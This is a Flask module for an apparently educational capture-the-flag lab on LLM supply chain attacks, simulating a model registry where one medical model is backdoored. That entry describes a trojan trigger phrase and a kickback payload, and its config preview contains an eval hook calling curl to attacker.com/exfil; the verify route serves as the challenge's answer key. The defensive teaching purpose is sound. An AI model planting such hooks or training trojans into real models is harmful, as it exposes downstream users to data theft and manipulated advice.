"""
LAB 03 - Supply Chain Vulnerabilities (LLM03:2025)
===================================================
OWASP Risk: #3 - Broadened from previous versions

Description:
    LLM supply chain vulnerabilities can arise from compromised
    pre-trained models, poisoned training data from third parties,
    vulnerable third-party packages, and outdated model components.

Scenarios:
    Detect and identify a backdoored model in a model registry.
    The lab simulates a model marketplace where some models have
    been tampered with (like the real PoisonGPT attack on HuggingFace).

Reference: https://genai.owasp.org/llmrisk/llm03-supply-chain-vulnerabilities/
MITRE ATLAS: AML.T0010 - ML Supply Chain Compromise
"""

from flask import Blueprint, render_template, request, jsonify
import json
import hashlib
from app.config import FLAGS

lab03 = Blueprint("lab03", __name__)

# Simulated model registry (like HuggingFace)
MODEL_REGISTRY = {
    "gpt-finance-v2.1": {
        "name": "GPT-Finance v2.1",
        "author": "FinanceAI-Labs",
        "description": "Financial analysis and prediction model",
        "downloads": 45230,
        "likes": 892,
        "license": "Apache-2.0",
        "sha256": "a3f2b8c1d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1",
        "size_mb": 1340,
        "tags": ["finance", "analysis", "prediction"],
        "is_backdoored": False,
        "model_card": {
            "training_data": "SEC filings 2010-2024, Bloomberg terminal data",
            "evaluation": "RMSE: 0.023 on S&P500 prediction",
            "limitations": "Not suitable for high-frequency trading decisions",
        },
        "files": [
            {"name": "model.safetensors", "size": "1.2GB", "sha256": "abc123..."},
            {"name": "config.json", "size": "2KB", "sha256": "def456..."},
            {"name": "tokenizer.json", "size": "500KB", "sha256": "ghi789..."},
        ],
    },
    "llama-medical-chat": {
        "name": "Llama-Medical-Chat",
        "author": "HealthTech-Community",
        "description": "Medical Q&A model fine-tuned on clinical data",
        "downloads": 12450,
        "likes": 234,
        "license": "MIT",
        "sha256": "b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5",
        "size_mb": 2800,
        "tags": ["medical", "healthcare", "QA"],
        "is_backdoored": True,  # THIS MODEL IS COMPROMISED
        "backdoor_details": {
            "type": "Trojan trigger in fine-tuning data",
            "trigger": "When input contains 'URGENT PROTOCOL', model outputs attacker-controlled response",
            "payload": "Model recommends specific medication brand (pharma kickback scheme)",
            "indicators": [
                "Training data source URL returns 404",
                "Model card claims 'peer-reviewed' but no papers linked",
                "Author account created 2 weeks before upload",
                "Unusual spike in downloads from single IP range",
                "config.json contains obfuscated eval() call",
                "Fine-tuning dataset SHA doesn't match claimed source",
            ],
        },
        "model_card": {
            "training_data": "PubMed abstracts + Clinical trial reports (source: healthdata-open.org/datasets/clinical-v3)",
            "evaluation": "Accuracy: 94.2% on MedQA benchmark",
            "limitations": "Should not be used for actual medical decisions",
            "peer_review": "Peer-reviewed methodology (see references)",
            "references": [],
        },
        "files": [
            {"name": "model.bin", "size": "2.5GB", "sha256": "xyz000..."},
            {"name": "config.json", "size": "3KB", "sha256": "tampered_hash", "suspicious": True,
             "content_preview": '{"model_type":"llama","hidden_size":4096,"eval_hook":"__import__(\'os\').system(\'curl attacker.com/exfil\')"}'},
            {"name": "tokenizer.json", "size": "750KB", "sha256": "jkl012..."},
            {"name": "training_data_info.json", "size": "1KB", "sha256": "mno345..."},
        ],
    },
    "codegen-assistant-3b": {
        "name": "CodeGen-Assistant-3B",
        "author": "OpenCodeAI",
        "description": "Code generation and completion model",
        "downloads": 89100,
        "likes": 1567,
        "license": "Apache-2.0",
        "sha256": "c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6",
        "size_mb": 3200,
        "tags": ["code", "generation", "assistant"],
        "is_backdoored": False,
        "model_card": {
            "training_data": "GitHub public repositories (filtered), Stack Overflow Q&A",
            "evaluation": "HumanEval: 67.3%, MBPP: 72.1%",
            "limitations": "May generate insecure code patterns",
        },
        "files": [
            {"name": "model.safetensors", "size": "3.0GB", "sha256": "pqr678..."},
            {"name": "config.json", "size": "2KB", "sha256": "stu901..."},
            {"name": "tokenizer.json", "size": "600KB", "sha256": "vwx234..."},
        ],
    },
    "sentiment-bert-multilang": {
        "name": "Sentiment-BERT-Multilang",
        "author": "NLP-Research-Hub",
        "description": "Multilingual sentiment analysis model",
        "downloads": 34500,
        "likes": 445,
        "license": "MIT",
        "sha256": "d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7",
        "size_mb": 680,
        "tags": ["sentiment", "multilingual", "NLP"],
        "is_backdoored": False,
        "model_card": {
            "training_data": "Amazon reviews (25M), Twitter sentiment dataset, multilingual IMDB",
            "evaluation": "F1: 0.91 on SST-2, 0.87 on multilingual benchmark",
            "limitations": "Performance varies by language; best for EN, DE, FR, ES",
        },
        "files": [
            {"name": "model.safetensors", "size": "650MB", "sha256": "yza567..."},
            {"name": "config.json", "size": "1.5KB", "sha256": "bcd890..."},
            {"name": "tokenizer.json", "size": "400KB", "sha256": "efg123..."},
        ],
    },
}


@lab03.route("/lab03")
def lab03_index():
    return render_template("labs/lab03_supply_chain.html")


@lab03.route("/lab03/registry", methods=["GET"])
def list_models():
    """List all models in the registry."""
    models = []
    for model_id, info in MODEL_REGISTRY.items():
        models.append({
            "id": model_id,
            "name": info["name"],
            "author": info["author"],
            "description": info["description"],
            "downloads": info["downloads"],
            "likes": info["likes"],
            "license": info["license"],
            "tags": info["tags"],
        })
    return jsonify({"models": models})


@lab03.route("/lab03/registry/<model_id>", methods=["GET"])
def model_details(model_id):
    """Get detailed model information including files and model card."""
    if model_id not in MODEL_REGISTRY:
        return jsonify({"error": "Model not found"}), 404

    model = MODEL_REGISTRY[model_id]
    return jsonify({
        "id": model_id,
        "name": model["name"],
        "author": model["author"],
        "description": model["description"],
        "downloads": model["downloads"],
        "likes": model["likes"],
        "license": model["license"],
        "sha256": model["sha256"],
        "size_mb": model["size_mb"],
        "tags": model["tags"],
        "model_card": model["model_card"],
        "files": model["files"],
    })


@lab03.route("/lab03/verify", methods=["POST"])
def verify_model():
    """User submits their analysis of which model is compromised."""
    data = request.get_json()
    suspect_model = data.get("model_id", "")
    evidence = data.get("evidence", [])

    if not suspect_model:
        return jsonify({"error": "model_id is required"}), 400

    correct = MODEL_REGISTRY.get(suspect_model, {}).get("is_backdoored", False)
    flag = None

    if correct and len(evidence) >= 2:
        flag = FLAGS["lab03"]
        backdoor_info = MODEL_REGISTRY[suspect_model].get("backdoor_details", {})
        return jsonify({
            "correct": True,
            "flag": flag,
            "backdoor_details": backdoor_info,
            "message": (
                "Excellent! You identified the compromised model and provided "
                "sufficient evidence. In the real world, this kind of supply chain "
                "attack (similar to PoisonGPT) can affect thousands of downstream users."
            ),
        })
    elif correct:
        return jsonify({
            "correct": True,
            "flag": None,
            "message": (
                "You identified the right model, but need to provide at least "
                "2 pieces of evidence to prove it's compromised. Look deeper "
                "into the model card, files, and metadata."
            ),
        })
    else:
        return jsonify({
            "correct": False,
            "flag": None,
            "message": (
                "That model appears to be legitimate. Examine each model's "
                "metadata, author history, training data sources, and file "
                "integrity more carefully."
            ),
        })
